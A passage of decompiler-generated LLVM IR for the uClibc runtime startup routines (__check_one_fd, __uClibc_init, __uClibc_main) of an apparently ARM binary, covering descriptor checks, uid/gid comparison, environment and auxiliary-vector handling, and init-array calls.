dec_label_pc_14cf0.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14ccc = load i32, i32* @r4, align 4
  store i32 %v3_14ccc, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14cf0

dec_label_pc_14cf0:                               ; preds = %dec_label_pc_14cf0.dec_label_pc_14cf0_crit_edge, %dec_label_pc_14cf0.lr.ph
  %v1_14cf0 = phi i32 [ %v1_14cfc, %dec_label_pc_14cf0.dec_label_pc_14cf0_crit_edge ], [ 0, %dec_label_pc_14cf0.lr.ph ]
  %v0_14cf0 = phi i32 [ %v0_14cf0.pre, %dec_label_pc_14cf0.dec_label_pc_14cf0_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -8), %dec_label_pc_14cf0.lr.ph ]
  %v4_14cf0 = mul i32 %v1_14cf0, 4
  %v5_14cf0 = add i32 %v4_14cf0, %v0_14cf0
  %v6_14cf0 = inttoptr i32 %v5_14cf0 to i32*
  %v7_14cf0 = load i32, i32* %v6_14cf0, align 4
  call void @__pseudo_branch(i32 %v7_14cf0)
  %v0_14cfc = load i32, i32* %r4.global-to-local, align 4
  %v1_14cfc = add i32 %v0_14cfc, -1
  store i32 %v1_14cfc, i32* %r4.global-to-local, align 4
  %v2_14cfc = icmp eq i32 %v0_14cfc, 0
  br i1 %v2_14cfc, label %dec_label_pc_14d04, label %dec_label_pc_14cf0.dec_label_pc_14cf0_crit_edge

dec_label_pc_14cf0.dec_label_pc_14cf0_crit_edge:  ; preds = %dec_label_pc_14cf0
  %v0_14cf0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14cf0

dec_label_pc_14d04:                               ; preds = %dec_label_pc_14cf0
  %v0_14d08.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_14d08 = add i32 %v0_14d08.pre, 27596
  %v3_14d08 = inttoptr i32 %v2_14d08 to i32*
  %v4_14d08 = load i32, i32* %v3_14d08, align 4
  %v2_14d0c = icmp eq i32 %v4_14d08, 0
  br i1 %v2_14d0c, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_14d04
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14d04, %bb
  %v2_14d14 = xor i1 %v2_14d0c, true
  call void @__pseudo_cond_branch(i1 %v2_14d14, i32 %v4_14d08)
  %v0_14d1c = load i32, i32* %r5.global-to-local, align 4
  %v2_14d1c = add i32 %v0_14d1c, 27600
  %v3_14d1c = inttoptr i32 %v2_14d1c to i32*
  %v4_14d1c = load i32, i32* %v3_14d1c, align 4
  %v2_14d20 = icmp eq i32 %v4_14d1c, 0
  br i1 %v2_14d20, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_14d28 = xor i1 %v2_14d20, true
  call void @__pseudo_cond_branch(i1 %v2_14d28, i32 %v4_14d1c)
  %v2_14d2c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14d2c, i32* %r4.global-to-local, align 4
  %v1_14d30 = load i32, i32* @r0, align 4
  ret i32 %v1_14d30

; uselistorder directives
  uselistorder i32 %v1_14cfc, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_14d5c = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_14d64 = icmp eq i32 %v2_14d5c, -1
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r3, align 4
  br i1 %v3_14d64, label %dec_label_pc_14d70, label %dec_label_pc_14d88

dec_label_pc_14d70:                               ; preds = %entry
  %v0_14d74 = load i32, i32* %r5.global-to-local, align 4
  %v2_14d7c = call i32 @__GI_open(i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -33856), i32 %v0_14d74)
  %v1_14d80 = load i32, i32* %r4.global-to-local, align 4
  %v1_14d84 = icmp ne i32 %v2_14d7c, %v1_14d80
  call void @__pseudo_cond_branch(i1 %v1_14d84, i32 ptrtoint (i32* @global_var_139d8.834 to i32))
  br label %dec_label_pc_14d88

dec_label_pc_14d88:                               ; preds = %entry, %dec_label_pc_14d70
  %v1_14d90 = phi i32 [ %v2_14d5c, %entry ], [ %v2_14d7c, %dec_label_pc_14d70 ]
  ret i32 %v1_14d90

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_14d88, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r4.global-to-local, align 4
  %v4_14dac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 96) to i32*), align 4
  %v1_14db0 = inttoptr i32 %v4_14dac to i32*
  %v2_14db0 = load i32, i32* %v1_14db0, align 4
  %v2_14db4 = icmp eq i32 %v2_14db0, 0
  br i1 %v2_14db4, label %dec_label_pc_14dbc, label %dec_label_pc_14df0

dec_label_pc_14dbc:                               ; preds = %entry
  %v4_14dc0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 56) to i32*), align 4
  %v2_14dc8 = icmp eq i32 %v4_14dc0, 0
  store i32 4096, i32* %v1_14db0, align 4
  br i1 %v2_14dc8, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_14dbc
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_14dbc, %bb
  %v2_14dd4 = xor i1 %v2_14dc8, true
  call void @__pseudo_cond_branch(i1 %v2_14dd4, i32 %v4_14dc0)
  %v0_14ddc = load i32, i32* %r4.global-to-local, align 4
  %v2_14ddc = add i32 %v0_14ddc, -92004
  %v2_14de4 = icmp eq i32 %v2_14ddc, 0
  br i1 %v2_14de4, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_14dec = xor i1 %v2_14de4, true
  call void @__pseudo_cond_branch(i1 %v2_14dec, i32 %v2_14ddc)
  br label %dec_label_pc_14df0

dec_label_pc_14df0:                               ; preds = %entry, %bb6
  %v1_14df4 = load i32, i32* @r0, align 4
  ret i32 %v1_14df4

; uselistorder directives
  uselistorder label %dec_label_pc_14df0, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_14e10 = add i32 %tmp, 4
  store i32 %v1_14e10, i32* %ip.global-to-local, align 4
  %v2_14e14 = load i32, i32* %arg3, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r6, align 4
  %v3_14e20 = mul i32 %arg2, 4
  store i32 %v3_14e20, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_14e28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 20) to i32*), align 4
  store i32 %v4_14e28, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r2.global-to-local, align 4
  %v2_14e30 = ptrtoint i32* %stack_var_-120 to i32
  %v4_14e34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 28) to i32*), align 4
  store i32 %v4_14e34, i32* %r4.global-to-local, align 4
  %v2_14e3c = add i32 %v1_14e10, %v3_14e20
  store i32 %v2_14e3c, i32* %ip.global-to-local, align 4
  %v9_14e40 = icmp eq i32 %v2_14e3c, %v2_14e14
  store i1 %v9_14e40, i1* %cpsr_z.global-to-local, align 1
  %v2_14e44 = inttoptr i32 %v4_14e28 to i32*
  store i32 %arg7, i32* %v2_14e44, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 27600, i32* %r2.global-to-local, align 4
  %v0_14e50 = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_14e40, label %bb, label %.critedge

bb:                                               ; preds = %entry
  %v1_14e54 = load i32, i32* @r7, align 4
  %v2_14e54 = load i32, i32* %r5.global-to-local, align 4
  %v3_14e54 = add i32 %v2_14e54, %v1_14e54
  store i32 %v3_14e54, i32* %r3.global-to-local, align 4
  %v1_14e58 = load i32, i32* @r6, align 4
  %v3_14e58 = add i32 %v1_14e58, 27600
  %v4_14e58 = inttoptr i32 %v3_14e58 to i32*
  store i32 %arg6, i32* %v4_14e58, align 4
  %v0_14e5c = load i32, i32* %ip.global-to-local, align 4
  %v1_14e5c = load i32, i32* %r4.global-to-local, align 4
  %v2_14e5c = inttoptr i32 %v1_14e5c to i32*
  store i32 %v0_14e5c, i32* %v2_14e5c, align 4
  store i32 120, i32* @r2, align 4
  %v1_14e68 = load i32, i32* %r3.global-to-local, align 4
  %v2_14e68 = load i32, i32* %r4.global-to-local, align 4
  %v3_14e68 = inttoptr i32 %v2_14e68 to i32*
  store i32 %v1_14e68, i32* %v3_14e68, align 4
  br label %bb58

.critedge:                                        ; preds = %entry
  %v1_14e58.c = load i32, i32* @r6, align 4
  %v3_14e58.c = add i32 %v1_14e58.c, 27600
  %v4_14e58.c = inttoptr i32 %v3_14e58.c to i32*
  store i32 %arg6, i32* %v4_14e58.c, align 4
  %v0_14e5c.c = load i32, i32* %ip.global-to-local, align 4
  %v1_14e5c.c = load i32, i32* %r4.global-to-local, align 4
  %v2_14e5c.c = inttoptr i32 %v1_14e5c.c to i32*
  store i32 %v0_14e5c.c, i32* %v2_14e5c.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb58

bb58:                                             ; preds = %.critedge, %bb
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_14e74 = bitcast i32* %stack_var_-120 to i8*
  %v3_14e74 = call i32 @__GI_memset(i8* %v2_14e74, i32 0)
  %v0_14e78 = load i32, i32* %r4.global-to-local, align 4
  %v1_14e78 = inttoptr i32 %v0_14e78 to i32*
  %storemerge.pre = load i32, i32* %v1_14e78, align 4
  br label %dec_label_pc_14e84

dec_label_pc_14e84:                               ; preds = %dec_label_pc_14e84, %bb58
  %storemerge = phi i32 [ %storemerge.pre, %bb58 ], [ %v4_14e84, %dec_label_pc_14e84 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_14e84 = inttoptr i32 %storemerge to i32*
  %v2_14e84 = load i32, i32* %v1_14e84, align 4
  store i32 %v2_14e84, i32* %r3.global-to-local, align 4
  %v4_14e84 = add i32 %storemerge, 4
  store i32 %v4_14e84, i32* %r2.global-to-local, align 4
  %v2_14e88 = icmp eq i32 %v2_14e84, 0
  store i32 %v4_14e84, i32* %r1.global-to-local, align 4
  br i1 %v2_14e88, label %dec_label_pc_14e94, label %dec_label_pc_14e84

dec_label_pc_14e94:                               ; preds = %dec_label_pc_14e84
  store i32 %v4_14e84, i32* @r4, align 4
  store i32 %v2_14e30, i32* @r5, align 4
  %v1_14eb829 = inttoptr i32 %v4_14e84 to i32*
  %v2_14eb830 = load i32, i32* %v1_14eb829, align 4
  store i32 %v2_14eb830, i32* %r3.global-to-local, align 4
  %v2_14ebc32 = icmp eq i32 %v2_14eb830, 0
  store i1 %v2_14ebc32, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ebc32, label %dec_label_pc_14ec4, label %dec_label_pc_14ea0

dec_label_pc_14ea0:                               ; preds = %dec_label_pc_14e94, %dec_label_pc_14eb8
  %v4_14ea8 = phi i32 [ %v1_14eb4, %dec_label_pc_14eb8 ], [ %v4_14e84, %dec_label_pc_14e94 ]
  %v5_14ea4 = phi i32 [ %v2_14eb8, %dec_label_pc_14eb8 ], [ %v2_14eb830, %dec_label_pc_14e94 ]
  %v2_14ea0 = icmp ugt i32 %v5_14ea4, 13
  %v7_14ea0 = icmp eq i32 %v5_14ea4, 14
  store i1 %v7_14ea0, i1* %cpsr_z.global-to-local, align 1
  %v2_14ea4 = xor i1 %v2_14ea0, true
  %v3_14ea4 = or i1 %v7_14ea0, %v2_14ea4
  br i1 %v3_14ea4, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_14ea0
  %v6_14ea4 = and i32 %v5_14ea4, 536870912
  %v7_14ea4 = icmp ne i32 %v6_14ea4, 0
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_14ea0, %bb59
  %v1_14eb0 = phi i1 [ %v2_14ea0, %dec_label_pc_14ea0 ], [ %v7_14ea4, %bb59 ]
  %v2_14ea8 = xor i1 %v1_14eb0, true
  %v3_14ea8 = or i1 %v7_14ea0, %v2_14ea8
  br i1 %v3_14ea8, label %bb61, label %dec_label_pc_14eb8

bb61:                                             ; preds = %bb60
  store i32 %v4_14ea8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14eb8

dec_label_pc_14eb8:                               ; preds = %bb60, %bb61
  call void @__pseudo_cond_branch(i1 %v3_14ea8, i32 ptrtoint (i32* @global_var_11bf0.843 to i32))
  %v0_14eb4 = load i32, i32* @r4, align 4
  %v1_14eb4 = add i32 %v0_14eb4, 8
  store i32 %v1_14eb4, i32* @r4, align 4
  %v1_14eb8 = inttoptr i32 %v1_14eb4 to i32*
  %v2_14eb8 = load i32, i32* %v1_14eb8, align 4
  store i32 %v2_14eb8, i32* %r3.global-to-local, align 4
  %v2_14ebc = icmp eq i32 %v2_14eb8, 0
  store i1 %v2_14ebc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ebc, label %dec_label_pc_14ec4, label %dec_label_pc_14ea0

dec_label_pc_14ec4:                               ; preds = %dec_label_pc_14eb8, %dec_label_pc_14e94
  %v1_14ec8 = call i32 @_dl_aux_init(i32 %v2_14e30)
  store i32 %v1_14ec8, i32* @r0, align 4
  %v1_14ecc = call i32 @__GI___uClibc_init(i32 %v1_14ec8)
  store i32 %v1_14ecc, i32* @r0, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  store i32 %tmp54, i32* @r2, align 4
  %v0_14ed8 = load i32, i32* @r6, align 4
  %v2_14ed8 = add i32 %v0_14ed8, 96
  %v3_14ed8 = inttoptr i32 %v2_14ed8 to i32*
  %v4_14ed8 = load i32, i32* %v3_14ed8, align 4
  store i32 %v4_14ed8, i32* %r1.global-to-local, align 4
  store i32 %tmp53, i32* @r3, align 4
  %v2_14ee0 = icmp eq i32 %tmp54, 0
  store i1 %v2_14ee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ee0, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_14ec4
  store i32 4096, i32* @r2, align 4
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_14ec4, %bb62
  %v0_14eec = phi i32 [ %tmp54, %dec_label_pc_14ec4 ], [ 4096, %bb62 ]
  %v3_14ee8 = icmp eq i32 %tmp53, -1
  %v8_14ee8 = icmp eq i32 %tmp53, -1
  store i1 %v8_14ee8, i1* %cpsr_z.global-to-local, align 1
  %v2_14eec = inttoptr i32 %v4_14ed8 to i32*
  store i32 %v0_14eec, i32* %v2_14eec, align 4
  br i1 %v3_14ee8, label %dec_label_pc_14ef4, label %dec_label_pc_14f1c

dec_label_pc_14ef4:                               ; preds = %bb63
  %v0_14ef4 = call i32 @getuid()
  store i32 %v0_14ef4, i32* @r0, align 4
  store i32 %v0_14ef4, i32* @r4, align 4
  %v0_14efc = call i32 @geteuid()
  store i32 %v0_14efc, i32* @r0, align 4
  %v0_14f00 = load i32, i32* @r4, align 4
  %v9_14f00 = icmp eq i32 %v0_14f00, %v0_14efc
  store i1 %v9_14f00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14f00, label %dec_label_pc_14f08, label %dec_label_pc_14f44

dec_label_pc_14f08:                               ; preds = %dec_label_pc_14ef4
  %v1_14f08 = call i32 @getgid(i32 %v0_14efc)
  store i32 %v1_14f08, i32* @r0, align 4
  store i32 %v1_14f08, i32* @r4, align 4
  %v0_14f10 = call i32 @getegid()
  store i32 %v0_14f10, i32* @r0, align 4
  %v0_14f14 = load i32, i32* @r4, align 4
  %v9_14f14 = icmp eq i32 %v0_14f14, %v0_14f10
  store i1 %v9_14f14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14f14, label %dec_label_pc_14f1c, label %dec_label_pc_14f44

dec_label_pc_14f1c:                               ; preds = %dec_label_pc_14f08, %bb63
  store i32 %tmp53, i32* @r2, align 4
  store i1 %v8_14ee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_14ee8, label %dec_label_pc_14f68, label %dec_label_pc_14f28

dec_label_pc_14f28:                               ; preds = %dec_label_pc_14f1c
  store i32 %tmp52, i32* @r3, align 4
  %v9_14f2c = icmp eq i32 %tmp53, %tmp52
  store i1 %v9_14f2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14f2c, label %dec_label_pc_14f34, label %dec_label_pc_14f44

dec_label_pc_14f34:                               ; preds = %dec_label_pc_14f28
  store i32 %tmp51, i32* @r2, align 4
  store i32 %tmp50, i32* @r3, align 4
  %v9_14f3c = icmp eq i32 %tmp51, %tmp50
  store i1 %v9_14f3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14f3c, label %dec_label_pc_14f68, label %dec_label_pc_14f44

dec_label_pc_14f44:                               ; preds = %dec_label_pc_14f28, %dec_label_pc_14f08, %dec_label_pc_14ef4, %dec_label_pc_14f34
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_14f4c = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 32770, i32* %r1.global-to-local, align 4
  %v2_14f58 = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 32770, i32* %r1.global-to-local, align 4
  %v2_14f64 = call i32 @__check_one_fd(i32 2, i32 32770)
  store i32 %v2_14f64, i32* @r0, align 4
  br label %dec_label_pc_14f68

dec_label_pc_14f68:                               ; preds = %dec_label_pc_14f34, %dec_label_pc_14f1c, %dec_label_pc_14f44
  %v0_14f68 = load i32, i32* @r7, align 4
  %v1_14f68 = inttoptr i32 %v0_14f68 to i32*
  %v2_14f68 = load i32, i32* %v1_14f68, align 4
  store i32 %v2_14f68, i32* %r2.global-to-local, align 4
  store i32 2400, i32* %r3.global-to-local, align 4
  %v1_14f70 = load i32, i32* @r6, align 4
  %v3_14f70 = add i32 %v1_14f70, 2400
  %v4_14f70 = inttoptr i32 %v3_14f70 to i32*
  store i32 %v2_14f68, i32* %v4_14f70, align 4
  %v0_14f74 = load i32, i32* @r7, align 4
  %v1_14f74 = inttoptr i32 %v0_14f74 to i32*
  %v2_14f74 = load i32, i32* %v1_14f74, align 4
  store i32 %v2_14f74, i32* @r4, align 4
  %v2_14f78 = icmp eq i32 %v2_14f74, 0
  store i1 %v2_14f78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14f78, label %bb65, label %dec_label_pc_14f80

dec_label_pc_14f80:                               ; preds = %dec_label_pc_14f68
  store i32 116, i32* %r3.global-to-local, align 4
  %v0_14f84 = load i32, i32* @r6, align 4
  %v2_14f84 = add i32 %v0_14f84, 116
  %v3_14f84 = inttoptr i32 %v2_14f84 to i32*
  %v4_14f84 = load i32, i32* %v3_14f84, align 4
  store i32 %v4_14f84, i32* %r3.global-to-local, align 4
  %v2_14f88 = inttoptr i32 %v4_14f84 to i32*
  store i32 %v2_14f74, i32* %v2_14f88, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_14f90 = load i32, i32* @r7, align 4
  %v1_14f90 = inttoptr i32 %v0_14f90 to i32*
  %v2_14f90 = load i32, i32* %v1_14f90, align 4
  %v4_14f94 = call i32 @__GI_strrchr(i32 %v2_14f90, i32 47, i32 %v2_14f68, i32 %v4_14f84)
  store i32 %v4_14f94, i32* @r0, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v2_14f9c = icmp eq i32 %v4_14f94, 0
  store i1 %v2_14f9c, i1* %cpsr_z.global-to-local, align 1
  %v0_14fa0 = load i32, i32* @r6, align 4
  %v2_14fa0 = add i32 %v0_14fa0, 64
  %v3_14fa0 = inttoptr i32 %v2_14fa0 to i32*
  %v4_14fa0 = load i32, i32* %v3_14fa0, align 4
  store i32 %v4_14fa0, i32* %r2.global-to-local, align 4
  br i1 %v2_14f9c, label %.thread47, label %bb64

.thread47:                                        ; preds = %dec_label_pc_14f80
  %v2_14fa848 = inttoptr i32 %v4_14fa0 to i32*
  store i32 0, i32* %v2_14fa848, align 4
  br label %bb65

bb64:                                             ; preds = %dec_label_pc_14f80
  %v2_14fa4 = add i32 %v4_14f94, 1
  store i32 %v2_14fa4, i32* %r3.global-to-local, align 4
  %v2_14fa8 = inttoptr i32 %v4_14fa0 to i32*
  store i32 %v4_14f94, i32* %v2_14fa8, align 4
  %v1_14fac = load i32, i32* %r3.global-to-local, align 4
  %v2_14fac = load i32, i32* %r2.global-to-local, align 4
  %v3_14fac = inttoptr i32 %v2_14fac to i32*
  store i32 %v1_14fac, i32* %v3_14fac, align 4
  br label %bb65

bb65:                                             ; preds = %.thread47, %bb64, %dec_label_pc_14f68
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_14fc4 = load i32, i32* @r6, align 4
  %v2_14fc4 = add i32 %v0_14fc4, -12
  store i32 %v2_14fc4, i32* %r8.global-to-local, align 4
  store i32 27596, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_14fd4 = add i32 %v0_14fc4, 27596
  %v4_14fd4 = inttoptr i32 %v3_14fd4 to i32*
  store i32 %arg5, i32* %v4_14fd4, align 4
  %v0_14fec17 = load i32, i32* %r4.global-to-local, align 4
  %v1_14fec18 = load i32, i32* %r5.global-to-local, align 4
  %v3_14fec20 = icmp ult i32 %v0_14fec17, %v1_14fec18
  %v9_14fec26 = icmp eq i32 %v0_14fec17, %v1_14fec18
  store i1 %v9_14fec26, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14fec20, label %dec_label_pc_14fdc, label %dec_label_pc_1501c.lr.ph

dec_label_pc_14fdc:                               ; preds = %dec_label_pc_14fdc, %bb65
  %v1_14fdc = phi i32 [ %v1_14fe8, %dec_label_pc_14fdc ], [ %v0_14fec17, %bb65 ]
  %v0_14fdc = load i32, i32* %r8.global-to-local, align 4
  %v4_14fdc = mul i32 %v1_14fdc, 4
  %v5_14fdc = add i32 %v4_14fdc, %v0_14fdc
  %v6_14fdc = inttoptr i32 %v5_14fdc to i32*
  %v7_14fdc = load i32, i32* %v6_14fdc, align 4
  store i32 %v7_14fdc, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_14fdc)
  %v0_14fe8 = load i32, i32* %r4.global-to-local, align 4
  %v1_14fe8 = add i32 %v0_14fe8, 1
  store i32 %v1_14fe8, i32* %r4.global-to-local, align 4
  %v1_14fec = load i32, i32* %r5.global-to-local, align 4
  %v3_14fec = icmp ult i32 %v1_14fe8, %v1_14fec
  %v9_14fec = icmp eq i32 %v1_14fe8, %v1_14fec
  store i1 %v9_14fec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14fec, label %dec_label_pc_14fdc, label %dec_label_pc_1501c.lr.ph

dec_label_pc_1501c.lr.ph:                         ; preds = %dec_label_pc_14fdc, %bb65
  %v2_14ff4 = icmp eq i32 %v0_14e50, 0
  store i1 %v2_14ff4, i1* %cpsr_z.global-to-local, align 1
  %v2_14ffc = xor i1 %v2_14ff4, true
  call void @__pseudo_cond_branch(i1 %v2_14ffc, i32 %v0_14e50)
  store i32 -12, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_15010 = load i32, i32* @r6, align 4
  %v2_15010 = add i32 %v0_15010, -12
  store i32 %v2_15010, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1501c

dec_label_pc_1501c:                               ; preds = %dec_label_pc_1501c.dec_label_pc_1501c_crit_edge, %dec_label_pc_1501c.lr.ph
  %v1_1501c = phi i32 [ %v1_15028, %dec_label_pc_1501c.dec_label_pc_1501c_crit_edge ], [ 0, %dec_label_pc_1501c.lr.ph ]
  %v0_1501c = phi i32 [ %v0_1501c.pre, %dec_label_pc_1501c.dec_label_pc_1501c_crit_edge ], [ %v2_15010, %dec_label_pc_1501c.lr.ph ]
  %v4_1501c = mul i32 %v1_1501c, 4
  %v5_1501c = add i32 %v4_1501c, %v0_1501c
  %v6_1501c = inttoptr i32 %v5_1501c to i32*
  %v7_1501c = load i32, i32* %v6_1501c, align 4
  store i32 %v7_1501c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_1501c)
  %v0_15028 = load i32, i32* %r4.global-to-local, align 4
  %v1_15028 = add i32 %v0_15028, 1
  store i32 %v1_15028, i32* %r4.global-to-local, align 4
  %v1_1502c = load i32, i32* %r5.global-to-local, align 4
  %v3_1502c = icmp ult i32 %v1_15028, %v1_1502c
  %v9_1502c = icmp eq i32 %v1_15028, %v1_1502c
  store i1 %v9_1502c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1502c, label %dec_label_pc_1501c.dec_label_pc_1501c_crit_edge, label %dec_label_pc_15034

dec_label_pc_1501c.dec_label_pc_1501c_crit_edge:  ; preds = %dec_label_pc_1501c
  %v0_1501c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1501c

dec_label_pc_15034:                               ; preds = %dec_label_pc_1501c
  %v0_15038.pre = load i32, i32* @r6, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_15038 = add i32 %v0_15038.pre, 108
  %v3_15038 = inttoptr i32 %v2_15038 to i32*
  %v4_15038 = load i32, i32* %v3_15038, align 4
  store i32 %v4_15038, i32* %r2.global-to-local, align 4
  store i32 %v4_15038, i32* %r3.global-to-local, align 4
  %v2_15040 = icmp eq i32 %v4_15038, 0
  store i1 %v2_15040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15040, label %dec_label_pc_15058, label %dec_label_pc_15048

dec_label_pc_15048:                               ; preds = %dec_label_pc_15034
  call void @__pseudo_branch(i32 %v4_15038)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15054 = load i32, i32* @r0, align 4
  %v2_15054 = inttoptr i32 %v1_15054 to i32*
  store i32 0, i32* %v2_15054, align 4
  %v0_1505c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15058

dec_label_pc_15058:                               ; preds = %dec_label_pc_15034, %dec_label_pc_15048
  %v0_1505c = phi i32 [ %v0_15038.pre, %dec_label_pc_15034 ], [ %v0_1505c.pre, %dec_label_pc_15048 ]
  store i32 84, i32* %r3.global-to-local, align 4
  %v2_1505c = add i32 %v0_1505c, 84
  %v3_1505c = inttoptr i32 %v2_1505c to i32*
  %v4_1505c = load i32, i32* %v3_1505c, align 4
  store i32 %v4_1505c, i32* %r2.global-to-local, align 4
  store i32 %v4_1505c, i32* %r3.global-to-local, align 4
  %v2_15064 = icmp eq i32 %v4_1505c, 0
  store i1 %v2_15064, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15064, label %dec_label_pc_1507c, label %dec_label_pc_1506c

dec_label_pc_1506c:                               ; preds = %dec_label_pc_15058
  call void @__pseudo_branch(i32 %v4_1505c)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15078 = load i32, i32* @r0, align 4
  %v2_15078 = inttoptr i32 %v1_15078 to i32*
  store i32 0, i32* %v2_15078, align 4
  %v0_15080.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1507c

dec_label_pc_1507c:                               ; preds = %dec_label_pc_15058, %dec_label_pc_1506c
  %v0_15080 = phi i32 [ %v0_1505c, %dec_label_pc_15058 ], [ %v0_15080.pre, %dec_label_pc_1506c ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_15080 = add i32 %v0_15080, 28
  %v3_15080 = inttoptr i32 %v2_15080 to i32*
  %v4_15080 = load i32, i32* %v3_15080, align 4
